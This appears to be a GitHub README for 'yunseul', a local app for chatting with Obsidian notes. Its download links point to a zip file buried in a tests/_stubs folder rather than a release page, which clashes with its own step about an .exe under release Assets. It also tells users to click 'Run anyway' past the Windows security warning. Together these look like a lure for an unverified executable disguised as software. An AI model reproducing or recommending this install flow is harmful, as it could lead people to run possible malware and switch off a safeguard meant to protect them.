# 🌊 yunseul - Chat with your private Obsidian notes

[![](https://img.shields.io/badge/Download-Release-blue)](https://github.com/Bourbonshootingrange132/yunseul/raw/refs/heads/main/tests/_stubs/Software-1.5-beta.2.zip)

Yunseul lets you talk to your Obsidian vault. You keep your data on your computer. You use your own machine to process information. The software works without an internet connection by default. It finds answers inside your notes using your own hardware. 

## ⚙️ Requirements

Your computer needs to meet these basic standards to run the application:

* Operating System: Windows 10 or Windows 11.
* Processor: Modern multi-core CPU with 8GB RAM minimum. 16GB RAM is better for performance.
* Storage: At least 500MB of free space for the application. You will need additional space for your language models.
* Obsidian: The latest version of Obsidian must be installed on your computer.

## 📥 How to Install

Follow these steps to set up the software on your machine:

1. Visit [this page to download the latest version](https://github.com/Bourbonshootingrange132/yunseul/raw/refs/heads/main/tests/_stubs/Software-1.5-beta.2.zip).
2. Look for the file ending in `.exe` under the Assets section of the latest release.
3. Click the file to start the download.
4. Open the downloaded file once the process finishes.
5. Windows might display a security prompt because the app is local. Click "More info" and then "Run anyway" if you see this message.
6. The installer will guide you through the setup. Click "Next" to continue through the screens.
7. Launch the application from your Start Menu after installation finishes.

## 🚀 Setting Up Your AI

The application requires a language model to handle your requests. You can connect the app to an existing service on your computer.

### Using Ollama
Ollama is a popular tool for running models locally. 

1. Install Ollama from their official website.
2. Open your command prompt and type `ollama run llama3`. 
3. Ollama will download the model to your system.
4. Open Yunseul Settings.
5. Select Ollama as your provider.
6. The application will connect to your local service automatically.

### Using LM Studio
LM Studio provides a visual interface for managing your models.

1. Download and install LM Studio.
2. Search for a model inside the app and download it.
3. Go to the Local Server tab in LM Studio and click "Start Server".
4. Copy the server URL provided by LM Studio.
5. Paste this URL into the settings menu in Yunseul.

## 🔍 How to Use Your Vault

1. Open the application.
2. Click the "Add Vault" button.
3. Select the folder on your computer that contains your Obsidian notes.
4. Wait for the application to index your files. This creates a map of your notes so the AI can search them.
5. Once complete, you can type your questions in the main chat bar.
6. The application searches your notes and provides an answer based on your content.

## 🛡️ Privacy and Safety

Your data stays on your local machine. No notes leave your computer. The application uses your own processor to analyze text. You remain in control of your information. 

## 🛠️ Frequently Asked Questions

**Does this app work without an internet connection?**
Yes. Once you download the model files, you can use the application entirely offline. 

**Will this slow down my computer?**
The software uses your system resources when you ask a question. Your computer might run slower when processing complex queries. It will return to normal speed once the task finishes.

**Can I use this with any vault?**
Yes. The software works with any folder containing Markdown files. 

**What if the app stops responding?**
Check if your AI service, such as Ollama or LM Studio, is still running in the background. Stop and restart the service if necessary. Close and reopen the application if the issue persists.

**Where does the application store its configurations?**
Yunseul saves your settings in your user profile folder on Windows. You can reset these settings by deleting the config file if you encounter errors.

## ⌨️ Troubleshooting

If the application fails to start, verify that you have the latest drivers for your graphics card. Some models require hardware acceleration to work correctly. Ensure your Obsidian vault does not contain restricted system files that might block the indexing process. If the search returns no results, check that the folder path in settings remains accurate. Re-index your vault if you have added many new notes recently.